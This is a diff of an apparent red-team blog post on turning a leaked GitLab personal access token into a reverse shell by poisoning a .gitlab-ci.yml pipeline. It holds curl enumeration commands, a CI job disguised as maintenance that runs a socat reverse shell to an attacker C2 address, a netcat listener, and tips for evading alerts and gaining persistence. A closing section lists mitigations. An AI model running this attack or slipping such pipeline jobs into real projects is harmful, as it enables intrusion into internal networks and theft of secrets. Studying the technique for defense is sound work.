@@ -11,123 +11,161 @@ showTableOfContents: true
 draft: false
 ---
 
-# Introduction: The Weight of a Token
+Introduction: The Weight of a Token
+===================================
 
-In modern development workflows, **Personal Access Tokens (PATs)** are the invisible keys that keep the machinery running. They are used to authenticate scripts, CI/CD pipelines, and various automation tools without the need for interactive logins. However, from an offensive perspective, a PAT is a high-value asset that often carries more weight than a standard password.
+Let’s be real for a second: in modern DevOps, **Personal Access Tokens (PATs)** are the invisible keys that keep the whole engine running. They authenticate scripts, CI/CD pipelines, and all those automation tools that developers love.
 
-## Defining the Asset: Personal Access Token (PAT)
-A PAT serves as a stand-in for traditional credentials. While they are easy to generate and use, they are rarely managed with the same level of scrutiny as master passwords.
+But from where we’re sitting, a PAT is a high-value asset that often carries way more weight than a standard password. Why? Because while people change their passwords, they rarely rotate their tokens with the same discipline.
 
-* **The Usage:** Developers leverage PATs to allow external tools to communicate with GitLab or GitHub APIs.
-* **The Vulnerability:** Tokens are frequently hardcoded into scripts, left in build logs, or shared through insecure collaboration channels.
-* **The Exploitation Potential:** Once a token is captured, an operator can impersonate the user, access private codebases, and—most importantly—interact with the CI/CD infrastructure.
+Defining the Asset: The PAT
+---------------------------
 
-## Understanding the Target: GitLab Runners
-To turn a token into a shell, we must understand **GitLab Runners**. These are the lightweight agents that execute the instructions defined in an application’s pipeline (usually the `.gitlab-ci.yml` file).
+A PAT is a stand-in for traditional credentials. They’re easy to generate, but they’re almost never managed with proper scrutiny.
 
-* **Self-Hosted Runners:** Unlike cloud-shared runners, these are installed directly on the organization's internal infrastructure (On-Premises, AWS EC2, GCP VM, etc.).
-* **The Strategic Value:** Internal runners often sit behind the firewall but have access to private subnets, internal databases, and deployment clusters. This makes them the perfect pivot point for a Red Team operation.
+*   **The Usage:** Developers use them to let external tools talk to GitLab or GitHub APIs.
+    
+*   **The Vulnerability:** You’ll find them hardcoded in scripts, buried in build logs, or just sitting in a Slack channel because "I just needed to fix the build real quick."
+    
+*   **The Exploitation Potential:** Once you snag a token, you aren't just a user; you’re an identity. You can touch private codebases and, more importantly, interact with the **CI/CD infrastructure**.
+    
 
----
+The Real Target: GitLab Runners
+-------------------------------
 
-# Reconnaissance: Tracking the Leak
-Finding a PAT is the first step in the kill chain. During an engagement, we typically look for these "leaky" spots:
+If you want to turn a token into a shell, you need to understand **GitLab Runners**. These are the agents that actually execute the commands defined in the .gitlab-ci.yml file.
 
-1.  **Source Code Repositories:** Hardcoded tokens in configuration files or scripts.
-2.  **Version Control Logs:** Historical commits (`git log`) where a token was added and later "deleted."
-3.  **Environment Files:** Accidental uploads of `.env` or `.gitconfig` files.
-4.  **Dev Workstations:** Locally stored tokens in compromised developer machines.
-5.  **Collaboration Tools:** Slack, Teams, or Jira tickets where tokens were shared for troubleshooting purposes.
+The "holy grail" here is the **Self-Hosted Runner**. Unlike cloud runners, these are installed directly inside the organization's network (On-Prem, AWS, GCP, etc.). Since they sit behind the firewall but have access to internal databases and private subnets, they are the perfect pivot point for a Red Team op.
 
----
+Reconnaissance: Tracking the Leak
+=================================
 
-# The Attack Flow: Poisoning the Pipeline
+Snagging a PAT is the first step in the kill chain. On an engagement, we’re usually hunting in these "leaky" spots:
 
-Compromising a CI/CD pipeline follows a specific logic:
+1.  **Source Code:** Look for hardcoded tokens in config files.
+    
+2.  **Git Logs:** Use git log to find historical commits where a token was added and then "deleted." (Git never forgets).
+    
+3.  **Environment Files:** Accidental uploads of .env or .gitconfig.
+    
+4.  **Collaboration Tools:** Slack, Teams, or Jira tickets where a dev was "just helping out" a teammate.
+    
 
-1.  **Initial Access:** The attacker obtains a PAT via one of the recon methods above.
-2.  **Code Injection:** Using the PAT, the attacker pushes a malicious update to the pipeline configuration (`.gitlab-ci.yml`).
-3.  **Automated Trigger:** The GitLab platform detects the push and assigns the job to an internal Runner.
-4.  **Local Execution:** The Self-Hosted Runner executes the malicious instructions inside the organization's network.
-5.  **C2 Callback:** The payload initiates a reverse shell, connecting back to the attacker’s Command & Control (C2) server, effectively punching a hole through the firewall from the inside out.
+The Attack Flow: Poisoning the Pipeline
+=======================================
 
----
+Poisoning a pipeline follows a very specific, logical flow:
 
-# Case Study: Execution & Exploitation
+1.  **Initial Access:** Grab that PAT via recon.
+    
+2.  **Code Injection:** Use the PAT to push a "malicious" update to the .gitlab-ci.yml.
+    
+3.  **Automated Trigger:** GitLab sees the push and tells an internal Runner to do its job.
+    
+4.  **Local Execution:** The Runner executes your instructions _inside_ the network.
+    
+5.  **C2 Callback:** Your payload initiates a reverse shell, punching a hole through the firewall from the inside out.
+    
 
-This scenario demonstrates the move from a leaked PAT to a stable reverse shell inside a private network.
+Case Study: From Token to Shell
+===============================
 
-### Step 1: API Enumeration (Recon)
-With a token in hand, our first move is to map out the accessible projects. We are looking for private repositories with CI/CD enabled.
+Let's walk through a real scenario: moving from a leaked PAT to a stable reverse shell inside a private LAN.
 
-```bash
+### Step 1: API Enumeration
+
+Once I have the token, my first move is to see what I actually own. I’m hunting for private repositories where CI/CD is active.
+
+```Bash
 curl --header 'PRIVATE-TOKEN: glpat-WQNQTESTANDO' \
-'[http://10.8.20.80/api/v4/projects?owned=true](http://10.8.20.80/api/v4/projects?owned=true)' | jq '.[] | {name: .name, id: .id, visibility: .visibility}'
+'http://10.8.20.80/api/v4/projects?owned=true' | jq '.[] | {name: .name, id: .id, visibility: .visibility}'
 ```
 
-Focus on projects marked as PRIVATE to maximize the impact of the data exfiltration.
+_Pro tip: Focus on projects marked as_ _**PRIVATE**__. That’s where the sensitive data lives._
 
-Step 2: Verifying Permissions
-Before injecting code, we must confirm our privilege level on the target project (e.g., Project ID: 1).
+### Step 2: Verifying Permissions
 
-Bash
+I need to know if I can actually push code. I’ll check my privilege level on the project (e.g., Project ID: 1).
+
+```Bash
 curl --header 'PRIVATE-TOKEN: glpat-WQNQTESTANDO' \
-'[http://10.8.20.80/api/v4/projects/1](http://10.8.20.80/api/v4/projects/1)' | jq '.permissions'
-Level 30 (Developer): The minimum required to commit code and trigger a build.
+'http://10.8.20.80/api/v4/projects/1' | jq '.permissions'
+```
 
-Level 40/50 (Maintainer/Owner): Full control over the project and runner settings.
+*   **Level 30 (Developer):** This is all we need. We can commit code and trigger builds.
+    
+*   **Level 40/50 (Maintainer/Owner):** Full God mode over the project and runner settings.
+    
 
-Step 3: Pipeline Poisoning
-We clone the target repository and modify the .gitlab-ci.yml file. To stay under the radar, we disguise our job as a "Security Scan" or "Cleanup Task."
+### Step 3: Pipeline Poisoning
 
-YAML
+Now for the fun part. I’ll clone the repo and modify the .gitlab-ci.yml file. To stay stealthy, I’ll name my job something boring like "Security Scan" or "Cleanup Task."
+
+```YAML
 variables:
-  # C2 Connection Details
+  # My C2 (Attacker) machine
   C2_HOST: "192.168.100.2"
   C2_PORT: "4445"
+
 
 stages:
   - build
   - maintenance
+
 
 infra_cleanup:
   stage: maintenance
   allow_failure: true
   script:
     - echo "Executing routine maintenance..."
-    # Socat for a stable, interactive TTY shell
+    # Using socat for a stable, interactive TTY shell
     - socat TCP:$C2_HOST:$C2_PORT EXEC:'bash -li',pty,stderr,setsid,sigint,sane
-The use of allow_failure: true ensures that even if our shell crashes, the pipeline won't trigger a "Failed Build" alert.
+```
 
-Step 4: The Trigger
-Start the listener on your C2 server:
+_Note: I use allow\_failure: true so that even if my shell dies, the pipeline doesn't show a big red "FAILED" sign that alerts the devs._
 
-Bash
+### Step 4: The Trigger
+
+First, I set up my listener on my machine:
+
+```Bash
 rlwrap nc -nlvp 4445
-Now, push the malicious configuration:
+```
 
-Bash
-git add .
-git commit -m "chore: update ci-cd maintenance script v1.1"
+Then, I push the "poisoned" config:
+
+```bash
+git add .  
+git commit -m "chore: update ci-cd maintenance script v1.1"  
 git push
-The moment the push hits the server, GitLab triggers the runner. Since it's an internal self-hosted agent, it executes our socat command and hands us a shell directly from the internal LAN.
+````
 
-# Impact of Compromise
-Once the runner is compromised, an operator can:
+The second that push hits, GitLab tells the internal runner to work. The runner executes my socat command, and suddenly, I have a shell sitting right inside their internal LAN.
 
-Exfiltrate Secrets: Read environment variables and files stored on the runner host.
+The Aftermath: Impact of Compromise
+===================================
 
-Establish Persistence: Add an SSH key to authorized_keys or install a persistent agent.
+Once you’re on that runner, the party is just starting:
 
-Bypass Controls: Disable SAST/DAST scanning stages to allow vulnerable code into production.
+*   **Exfiltrate Secrets:** You can read all the environment variables and files stored on the host.
+    
+*   **Persistence:** Add your SSH key to authorized\_keys or drop a persistent C2 agent.
+    
+*   **Bypass Controls:** You can literally disable security scans (SAST/DAST) for other projects to let your own exploits slide into production.
+    
 
-# Mitigation Strategies
-Securing a CI/CD environment requires more than just revoking a token.
+How to Stop People Like Us
+==========================
 
-Secret Detection: Implement tools like Gitleaks or TruffleHog to scan commits in real-time and block secrets before they hit the server.
+If you don't want to get popped this way, you need a multi-layered defense:
 
-Token Scoping: Enforce the Principle of Least Privilege. Tokens should be scoped to the minimum necessary (e.g., read_repository instead of api).
+1.  **Secret Detection:** Use tools like **Gitleaks** or **TruffleHog**. Block the commit if a secret is detected before it even hits the server.
+    
+2.  **Token Scoping:** Don't give every token api access. Use the Principle of Least Privilege. If it only needs to read a repo, only give it read\_repository.
+    
+3.  **Ephemeral Runners:** Use Docker-based runners that spin up a fresh container for every job and then delete it. This kills my persistence.
+    
+4.  **Branch Protection:** Never allow direct pushes to the main branch or changes to the .gitlab-ci.yml without a peer-reviewed Merge Request (MR).
+    
 
-Ephemeral Environments: Use Docker-based runners that spawn a new, isolated container for every job. This prevents an attacker from establishing persistence on the host machine.
-
-Branch Protection: Require Merge Request (MR) approvals for any changes to pipeline files.
+Stay sharp. The best defense is knowing exactly how the attack looks from the other side.
